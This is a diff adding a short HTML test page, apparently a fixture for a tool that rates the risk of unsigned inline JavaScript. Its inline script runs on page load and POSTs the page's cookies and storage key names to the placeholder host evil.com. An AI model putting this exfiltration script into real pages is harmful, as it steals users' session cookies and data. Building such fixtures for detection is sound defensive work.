@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Category 1A - Unsigned Inline JavaScript</title>
+</head>
+<body>
+    <h1>Malicious Inline Script Example</h1>
+    <script>
+        // This is unsigned, inline JavaScript - Category 1A (Critical Risk)
+        function exfiltrateData() {
+            fetch('https://evil.com/collect', {
+                method: 'POST',
+                body: JSON.stringify({
+                    cookies: document.cookie,
+                    localStorage: Object.keys(localStorage),
+                    sessionStorage: Object.keys(sessionStorage)
+                })
+            });
+        }
+        exfiltrateData();
+    </script>
+</body>
+</html>
